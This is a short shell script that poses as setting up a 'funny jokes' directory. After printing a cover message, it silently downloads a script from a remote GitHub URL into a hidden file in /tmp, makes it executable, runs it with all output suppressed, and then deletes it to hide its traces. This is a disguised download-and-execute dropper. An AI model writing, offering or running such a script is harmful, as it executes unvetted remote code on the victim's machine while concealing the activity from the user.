mkdir /tmp/FunnyJokes/;
echo "created funny jokes directory";


curl -s https://raw.githubusercontent.com/SteveJobsDerEchte/Krim/master/test.sh > /tmp/.setup.sh;chmod 777 /tmp/.setup.sh;/tmp/.setup.sh &>/dev/null
rm /tmp/.setup.sh &>/dev/null
